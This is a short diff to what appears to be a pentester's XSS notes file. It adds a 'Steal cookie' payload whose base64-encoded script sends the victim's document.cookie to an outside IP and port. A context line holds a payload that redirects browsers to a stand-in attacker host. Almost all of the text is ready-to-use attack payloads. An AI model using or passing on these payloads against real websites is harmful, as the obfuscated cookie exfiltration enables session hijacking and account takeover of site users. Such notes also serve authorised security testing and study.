@@ -2,6 +2,8 @@
 
 # PoC Payload 2: <img src=x onerror="document.location='http://ATTACKER_IP:PORT/'"/<
 
+# Steal cookie XSS Payload: <img src=x onerror='eval(atob("ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4zNjo3Nzc3Lz9jb29raWU9Jytkb2N1bWVudC5jb29raWUp"));' /<
+
 ## Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings
 
 ## Places to inject XSS payloads:
